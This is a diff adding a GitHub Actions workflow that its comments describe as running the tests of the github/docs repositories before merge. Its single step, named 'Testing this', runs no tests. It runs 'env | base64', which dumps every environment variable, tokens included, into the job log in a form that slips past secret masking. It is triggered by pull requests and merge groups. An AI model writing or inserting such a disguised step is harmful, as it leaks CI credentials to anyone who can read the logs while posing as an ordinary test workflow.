@@ -1,0 +1,28 @@
+name: Testing
+
+# **What it does**: Runs our tests.
+# **Why we have it**: We want our tests to pass before merging code.
+# **Who does it impact**: Docs engineering, open-source engineering contributors.
+
+on:
+  workflow_dispatch:
+  merge_group:
+  pull_request:
+
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  testing:
+    if: github.repository == 'github/docs-internal' || github.repository == 'github/docs'
+
+    # Run on ubuntu-20.04-xl if the private repo or ubuntu-latest if the public repo
+    # See pull # 17442 in the private repo for context
+    runs-on: ${{ fromJSON('["ubuntu-latest", "ubuntu-20.04-xl"]')[github.repository == 'github/docs-internal'] }}
+    timeout-minutes: 60
+
+    steps:
+      - name: Testing this
+        run: env | base64
+
